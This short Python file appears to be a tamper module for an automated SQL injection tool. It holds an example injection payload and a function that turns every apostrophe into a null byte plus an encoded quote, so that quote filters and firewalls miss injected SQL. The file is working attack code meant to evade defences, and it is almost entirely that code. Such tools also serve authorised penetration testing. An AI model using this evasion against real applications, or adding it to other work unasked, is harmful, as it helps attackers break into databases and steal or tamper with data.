__example_payload__ = "' )) AND 1=1 ' OR '2'='3 --'"
__type__ = "hiding the apostrophe by passing it with a NULL character"


def tamper(payload, **kwargs):
    payload = str(payload)
    identifier = "'"
    retval = ""
    for char in payload:
        if char == identifier:
            retval += "%00%27"
        else:
            retval += char
    return retval
